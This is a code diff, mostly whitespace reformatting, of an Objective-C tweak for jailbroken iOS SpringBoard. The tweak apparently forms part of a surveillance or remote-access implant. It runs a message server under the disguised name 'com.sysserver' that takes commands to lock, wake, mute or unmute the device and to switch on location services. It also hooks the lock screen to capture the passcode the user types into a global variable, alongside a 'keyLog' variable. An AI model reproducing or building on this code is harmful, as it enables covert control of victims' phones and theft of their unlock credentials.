@@ -8,47 +8,44 @@ NSString *passcode;
 NSString *keyLog;
 
 -(void)applicationDidFinishLaunching:(id)application {
-	%orig;
-	mediaController = (SBMediaController *)[%c(SBMediaController) sharedInstance];
-	CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
-	[messagingCenter runServerOnCurrentThread];
-	[messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
-	[messagingCenter registerForMessageName:@"commandWithReply" target:self selector:@selector(commandWithReply:withUserInfo:)];
+    %orig;
+    mediaController = (SBMediaController *)[%c(SBMediaController) sharedInstance];
+    CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
+    [messagingCenter runServerOnCurrentThread];
+    [messagingCenter registerForMessageName:@"commandWithNoReply" target:self selector:@selector(commandWithNoReply:withUserInfo:)];
+    [messagingCenter registerForMessageName:@"commandWithReply" target:self selector:@selector(commandWithReply:withUserInfo:)];
 }
 
 %new
 -(void)commandWithNoReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
-	NSString *command = [userInfo objectForKey:@"cmd"];
-	if ([command isEqual:@"home"]) {
-		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
-			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
-		}
-		else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(clickedMenuButton)]) {
-			[(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
-		}
-	} else if ([command isEqual:@"lock"]) {
-		[(SBUserAgent *)[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
-	} else if ([command isEqual:@"wake"]) {
-		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
-		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
-	} else if ([command isEqual:@"doublehome"]) {
-		if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
-			[(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
-		}
-		else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleMenuDoubleTap)]) {
-			[(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
-		}
+    NSString *command = [userInfo objectForKey:@"cmd"];
+    if ([command isEqual:@"home"]) {
+	if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonSinglePressUp)]) {
+	    [(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonSinglePressUp];
+	} else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(clickedMenuButton)]) {
+	    [(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
+        }
+    } else if ([command isEqual:@"lock"]) {
+	[(SBUserAgent *)[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
+    } else if ([command isEqual:@"wake"]) {
+	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
+	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
+    } else if ([command isEqual:@"doublehome"]) {
+	if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleHomeButtonDoublePressDown)]) {
+	    [(SBUIController *)[%c(SBUIController) sharedInstance] handleHomeButtonDoublePressDown];
+        } else if ([(SBUIController *)[%c(SBUIController) sharedInstance] respondsToSelector:@selector(handleMenuDoubleTap)]) {
+	    [(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
 	}
-	else if ([command isEqual:@"mute"]) {
-		if (!mediaController.ringerMuted) {
-			[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
-	    	[mediaController setRingerMuted:!mediaController.ringerMuted];
-		}
+    } else if ([command isEqual:@"mute"]) {
+	if (!mediaController.ringerMuted) {
+	    [(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
+	    [mediaController setRingerMuted:!mediaController.ringerMuted];
+	}
     } else if ([command isEqual:@"unmute"]) {
-		if (mediaController.ringerMuted) {
-			[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
-	    	[mediaController setRingerMuted:!mediaController.ringerMuted];
-		}
+	if (mediaController.ringerMuted) {
+	    [(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
+	    [mediaController setRingerMuted:!mediaController.ringerMuted];
+	}
     } 
     else if ([command isEqual:@"locationon"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:true];
@@ -101,9 +98,9 @@ NSString *keyLog;
 
 %hook SBLockScreenManager
 -(void)attemptUnlockWithPasscode:(id)arg1 {
-	%orig;
-	passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
-	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
-	[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
+    %orig;
+    passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
+    [(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
+    [(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
 }
 %end
